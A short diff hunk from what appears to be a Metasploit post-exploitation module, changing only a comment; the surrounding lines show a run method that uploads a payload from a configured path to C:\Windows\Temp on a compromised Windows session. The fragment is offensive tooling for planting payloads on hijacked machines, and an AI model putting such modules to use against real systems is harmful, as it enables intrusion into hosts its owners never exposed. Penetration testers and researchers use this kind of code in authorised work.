@@ -177,7 +177,7 @@ class Metasploit4 < Msf::Post
     return fileontrgt
   end
   #----------------------------------------------
-  #Runner
+  #Run Upload func
   def run
     print_good("Uploading Payload to machine.")
     upload(session,"#{datastore['PATH']}","C:\\Windows\\Temp")
